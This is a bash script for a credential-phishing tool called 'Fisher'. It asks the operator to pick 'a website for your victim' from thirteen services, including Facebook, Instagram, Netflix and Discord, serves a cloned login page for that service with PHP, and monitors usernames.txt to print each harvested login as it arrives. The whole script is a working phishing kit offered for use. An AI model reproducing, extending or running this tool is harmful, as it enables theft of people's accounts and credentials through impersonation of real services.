#!/bin/bash

#Setting Colours
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
PURPLE="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
PURPLEBG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')" BOLD="$(printf '\033[1;30m')" RESET="$(printf '\033[0m')"

#Install PHP
clear

sudo apt-get install php

clear




HOST='127.0.0.1'
PORT='8080'


function clean_up()
{
echo $PURPLE""
echo "All Processes are Cleaned"
    killall php > /dev/null 2>&1
    killall tail > /dev/null 2>&1
    killall inotifywait > /dev/null 2>&1
    clear
    echo "$RED _____ _     _               
$RED|  ___(_)___| |__   ___ _ __ 
$CYAN| |_  | / __| '_ \ / _ \ '__|
$BLUE|  _| | \__ \ | | |  __/ |   
$WHITE|_|   |_|___/_| |_|\___|_|"
    exit
}


function dotheaction(){
choice=""
echo ${ORANGE}"
"

while [[ $choice != "Q" ]]; do
read -t 1 choice
done
clean_up

}

function menu(){
clear

echo $BOLD""


echo "$RED _____ _     _               
$RED|  ___(_)___| |__   ___ _ __ 
$CYAN| |_  | / __| '_ \ / _ \ '__|
$BLUE|  _| | \__ \ | | |  __/ |   
$WHITE|_|   |_|___/_| |_|\___|_|"
echo "


${ORANGE}[::] ${CYAN}Select a website for your victim${ORANGE} [::]


${ORANGE}[${WHITE}01${ORANGE}] ${CYAN}Facebook
${ORANGE}[${WHITE}02${ORANGE}] ${CYAN}Instagram
${ORANGE}[${WHITE}03${ORANGE}] ${CYAN}Twitter
${ORANGE}[${WHITE}04${ORANGE}] ${CYAN}Netflix
${ORANGE}[${WHITE}05${ORANGE}] ${CYAN}Twitch
${ORANGE}[${WHITE}06${ORANGE}] ${CYAN}SnapChat
${ORANGE}[${WHITE}07${ORANGE}] ${CYAN}Spotify
${ORANGE}[${WHITE}08${ORANGE}] ${CYAN}Reddit
${ORANGE}[${WHITE}09${ORANGE}] ${CYAN}Adobe
${ORANGE}[${WHITE}10${ORANGE}] ${CYAN}Yahoo
${ORANGE}[${WHITE}11${ORANGE}] ${CYAN}DropBox
${ORANGE}[${WHITE}12${ORANGE}] ${CYAN}TikTok
${ORANGE}[${WHITE}12${ORANGE}] ${CYAN}Discord
"${GREEN}
read -p "Enter your target website: ${WHITE}" target_website


case $target_website in
1 | 01)
    cd sites/facebook/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
    inotifywait -m ./sites/facebook/ -e modify |
    while read dir action file; do
    if [[ $file == "usernames.txt" ]]; then
    tail -n 1 ./sites/facebook/usernames.txt 
    fi

    done &

    echo "
${ORANGE}[${WHITE}+${ORANGE}] ${CYAN}Setting up server${ORANGE} [${WHITE}+${ORANGE}]"
    sleep 2
    clear
    echo "
${BLUE}Successfully hosted at ${ORANGE}: ${GREEN}http://127.0.0.1:8080"
echo "
${CYAN}Enter 'Q or Ctrl+C' to exit"
;;
2 | 02)
      cd sites/instagram/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
    inotifywait -m ./sites/instagram/ -e modify |
    while read dir action file; do
    if [[ $file == "usernames.txt" ]]; then
    tail -n 1 ./sites/instagram/usernames.txt 
    fi

    done &

    echo "
${ORANGE}[${WHITE}+${ORANGE}] ${CYAN}Setting up server${ORANGE} [${WHITE}+${ORANGE}]"
    sleep 2
    clear
    echo "
${BLUE}Successfully hosted at ${ORANGE}: ${GREEN}http://127.0.0.1:8080"
echo "
${CYAN}Enter 'Q or Ctrl+C' to exit"  
;;
3 | 03)
      cd sites/twitter/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
    inotifywait -m ./sites/twitter/ -e modify |
    while read dir action file; do
    if [[ $file == "usernames.txt" ]]; then
    tail -n 1 ./sites/twitter/usernames.txt 
    fi

    done &

    echo "
${ORANGE}[${WHITE}+${ORANGE}] ${CYAN}Setting up server${ORANGE} [${WHITE}+${ORANGE}]"
    sleep 2
    clear
    echo "
${BLUE}Successfully hosted at ${ORANGE}: ${GREEN}http://127.0.0.1:8080"
echo "
${CYAN}Enter 'Q or Ctrl+C' to exit"
;;
4 | 04)
      cd sites/netflix/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
    inotifywait -m ./sites/netflix/ -e modify |
    while read dir action file; do
    if [[ $file == "usernames.txt" ]]; then
    tail -n 1 ./sites/netflix/usernames.txt 
    fi

    done &

    echo "
${ORANGE}[${WHITE}+${ORANGE}] ${CYAN}Setting up server${ORANGE} [${WHITE}+${ORANGE}]"
    sleep 2
    clear
    echo "
${BLUE}Successfully hosted at ${ORANGE}: ${GREEN}http://127.0.0.1:8080"
echo "
${CYAN}Enter 'Q or Ctrl+C' to exit"
;;
5 | 05)
      cd sites/twitch/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
    inotifywait -m ./sites/twitch/ -e modify |
    while read dir action file; do
    if [[ $file == "usernames.txt" ]]; then
    tail -n 1 ./sites/twitch/usernames.txt 
    fi

    done &

    echo "
${ORANGE}[${WHITE}+${ORANGE}] ${CYAN}Setting up server${ORANGE} [${WHITE}+${ORANGE}]"
    sleep 2
    clear
    echo "
${BLUE}Successfully hosted at ${ORANGE}: ${GREEN}http://127.0.0.1:8080"
echo "
${CYAN}Enter 'Q or Ctrl+C' to exit"
;;
6 | 06)
      cd sites/snapchat/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
    inotifywait -m ./sites/snapchat/ -e modify |
    while read dir action file; do
    if [[ $file == "usernames.txt" ]]; then
    tail -n 1 ./sites/snapchat/usernames.txt 
    fi

    done &

    echo "
${ORANGE}[${WHITE}+${ORANGE}] ${CYAN}Setting up server${ORANGE} [${WHITE}+${ORANGE}]"
    sleep 2
    clear
    echo "
${BLUE}Successfully hosted at ${ORANGE}: ${GREEN}http://127.0.0.1:8080"
echo "
${CYAN}Enter 'Q or Ctrl+C' to exit"
;;
7 | 07)
      cd sites/spotify/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
    inotifywait -m ./sites/spotify/ -e modify |
    while read dir action file; do
    if [[ $file == "usernames.txt" ]]; then
    tail -n 1 ./sites/spotify/usernames.txt 
    fi

    done &

    echo "
${ORANGE}[${WHITE}+${ORANGE}] ${CYAN}Setting up server${ORANGE} [${WHITE}+${ORANGE}]"
    sleep 2
    clear
    echo "
${BLUE}Successfully hosted at ${ORANGE}: ${GREEN}http://127.0.0.1:8080"
echo "
${CYAN}Enter 'Q or Ctrl+C' to exit"
;;
8 | 08)
      cd sites/reddit/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
    inotifywait -m ./sites/reddit/ -e modify |
    while read dir action file; do
    if [[ $file == "usernames.txt" ]]; then
    tail -n 1 ./sites/reddit/usernames.txt 
    fi

    done &

    echo "
${ORANGE}[${WHITE}+${ORANGE}] ${CYAN}Setting up server${ORANGE} [${WHITE}+${ORANGE}]"
    sleep 2
    clear
    echo "
${BLUE}Successfully hosted at ${ORANGE}: ${GREEN}http://127.0.0.1:8080"
echo "
${CYAN}Enter 'Q or Ctrl+C' to exit"
;;
9 | 09)
      cd sites/adobe/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
    inotifywait -m ./sites/adobe/ -e modify |
    while read dir action file; do
    if [[ $file == "usernames.txt" ]]; then
    tail -n 1 ./sites/adobe/usernames.txt 
    fi

    done &

    echo "
${ORANGE}[${WHITE}+${ORANGE}] ${CYAN}Setting up server${ORANGE} [${WHITE}+${ORANGE}]"
    sleep 2
    clear
    echo "
${BLUE}Successfully hosted at ${ORANGE}: ${GREEN}http://127.0.0.1:8080"
echo "
${CYAN}Enter 'Q or Ctrl+C' to exit"
;;
10)
      cd sites/yahoo/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
    inotifywait -m ./sites/yahoo/ -e modify |
    while read dir action file; do
    if [[ $file == "usernames.txt" ]]; then
    tail -n 1 ./sites/yahoo/usernames.txt 
    fi

    done &

    echo "
${ORANGE}[${WHITE}+${ORANGE}] ${CYAN}Setting up server${ORANGE} [${WHITE}+${ORANGE}]"
    sleep 2
    clear
    echo "
${BLUE}Successfully hosted at ${ORANGE}: ${GREEN}http://127.0.0.1:8080"
echo "
${CYAN}Enter 'Q or Ctrl+C' to exit"
;;
11)
      cd sites/dropbox/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
    inotifywait -m ./sites/dropbox/ -e modify |
    while read dir action file; do
    if [[ $file == "usernames.txt" ]]; then
    tail -n 1 ./sites/dropbox/usernames.txt 
    fi

    done &

    echo "
${ORANGE}[${WHITE}+${ORANGE}] ${CYAN}Setting up server${ORANGE} [${WHITE}+${ORANGE}]"
    sleep 2
    clear
    echo "
${BLUE}Successfully hosted at ${ORANGE}: ${GREEN}http://127.0.0.1:8080"
echo "
${CYAN}Enter 'Q or Ctrl+C' to exit"
;;
12)
      cd sites/tiktok/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
    inotifywait -m ./sites/tiktok/ -e modify |
    while read dir action file; do
    if [[ $file == "usernames.txt" ]]; then
    tail -n 1 ./sites/tiktok/usernames.txt 
    fi

    done &

    echo "
${ORANGE}[${WHITE}+${ORANGE}] ${CYAN}Setting up server${ORANGE} [${WHITE}+${ORANGE}]"
    sleep 2
    clear
    echo "
${BLUE}Successfully hosted at ${ORANGE}: ${GREEN}http://127.0.0.1:8080"
echo "
${CYAN}Enter 'Q or Ctrl+C' to exit"
;;
13)
      cd sites/discord/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
    inotifywait -m ./sites/discord/ -e modify |
    while read dir action file; do
    if [[ $file == "usernames.txt" ]]; then
    tail -n 1 ./sites/discord/usernames.txt 
    fi

    done &

    echo "
${ORANGE}[${WHITE}+${ORANGE}] ${CYAN}Setting up server${ORANGE} [${WHITE}+${ORANGE}]"
    sleep 2
    clear
    echo "
${BLUE}Successfully hosted at ${ORANGE}: ${GREEN}http://127.0.0.1:8080"
echo "
${CYAN}Enter 'Q or Ctrl+C' to exit"
;;
*)
    echo "${ORANGE}[${WHITE}+${ORANGE}] ${CYAN}Hold On! Other websites are in progress${ORANGE} [${WHITE}+${ORANGE}]"
    sleep 2; menu
;;
esac
dotheaction
}



trap clean_up SIGINT
menu
